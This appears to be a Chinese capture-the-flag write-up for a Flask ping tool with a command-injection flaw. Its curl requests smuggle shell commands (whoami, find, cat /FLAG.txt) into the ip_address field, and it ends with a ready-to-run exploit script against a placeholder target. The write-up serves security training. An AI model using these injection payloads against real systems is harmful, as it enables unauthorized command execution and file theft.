## 题目描述

Ping工具存在安全问题，需要找到并读取FLAG.txt文件

## 知识点

* **Type:** 命令注入 (Command Injection)
* **Category:** Injection
* **Framework:** Python Flask/Werkzeug
* **Attack Vector:** Web表单参数未过滤

## 解题方法思路

页面发现ping功能，提示"Ping gone wrong"暗示存在命令注入漏洞。通过在ip_address参数中注入系统命令（使用分号分隔），成功执行任意命令并读取FLAG.txt文件。

关键攻击路径：
- 漏洞发现：/ping端点存在命令注入
- 系统枚举：执行find命令搜索flag文件
- 文件读取：使用cat命令读取flag内容

## 解题步骤

### 1. 初始侦察
访问目标URL：<TARGET_URL>
识别技术栈：Python 3.8.20 + Werkzeug 3.0.6（Flask应用）
发现"ping tool"功能，存在输入表单用于输入IP地址

### 2. 漏洞验证
测试基本的ping功能：
```bash
curl -X POST <TARGET_URL>/ping \
  -d "ip_address=127.0.0.1"
```
返回正常的ping结果。

### 3. 命令注入测试
测试是否存在命令注入漏洞：
```bash
curl -X POST <TARGET_URL>/ping \
  -d "ip_address=127.0.0.1; whoami"
```
成功执行whoami命令，返回"root"，确认存在命令注入漏洞且以root权限运行。

### 4. 搜索Flag文件
利用命令注入搜索FLAG.txt文件位置：
```bash
curl -X POST <TARGET_URL>/ping \
  -d "ip_address=127.0.0.1; find / -name FLAG.txt 2>/dev/null"
```
发现FLAG.txt文件位于`/FLAG.txt`

### 5. 读取Flag内容
读取FLAG.txt文件获取flag：
```bash
curl -X POST <TARGET_URL>/ping \
  -d "ip_address=127.0.0.1; cat /FLAG.txt"
```
成功获取flag内容。

## exp

**注意：请将 `<TARGET_URL>` 替换为实际的目标URL，如 http://example.com:8080**

```bash
# 1. 测试命令注入漏洞
curl -X POST <TARGET_URL>/ping \
  -d "ip_address=127.0.0.1; whoami"

# 2. 搜索FLAG.txt文件位置
curl -X POST <TARGET_URL>/ping \
  -d "ip_address=127.0.0.1; find / -name FLAG.txt 2>/dev/null"

# 3. 读取FLAG.txt内容（两种方法）
curl -X POST <TARGET_URL>/ping \
  -d "ip_address=127.0.0.1; cat /FLAG.txt"


```

**最终获取到flag**